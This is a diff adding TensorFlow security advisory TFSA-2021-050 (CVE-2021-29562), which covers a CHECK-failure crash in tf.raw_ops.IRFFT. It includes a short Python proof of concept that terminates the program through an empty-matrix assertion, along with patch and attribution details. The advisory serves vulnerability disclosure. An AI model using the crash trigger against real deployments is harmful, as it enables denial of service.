@@ -1,0 +1,31 @@
+<h2>TFSA-2021-050: <code>CHECK</code>-fail in <code>tf.raw_ops.IRFFT</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29562</p>
+<h3>Impact</h3>
+<p>An attacker can cause a denial of service by exploiting a <code>CHECK</code>-failure coming
+from the implementation of <code>tf.raw_ops.IRFFT</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>values = [-10.0] * 130
+values[0] = -9.999999999999995
+inputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)
+inputs = tf.cast(inputs, dtype=tf.complex64)
+fft_length = tf.constant([0], shape=[1], dtype=tf.int32)</p>
+<p>tf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)
+```</p>
+<p>The above example causes Eigen code to operate on an empty matrix. This triggers
+on an assertion and causes program termination.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2">1c56f53be0b722ca657cbc7df461ed676c8642a2</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
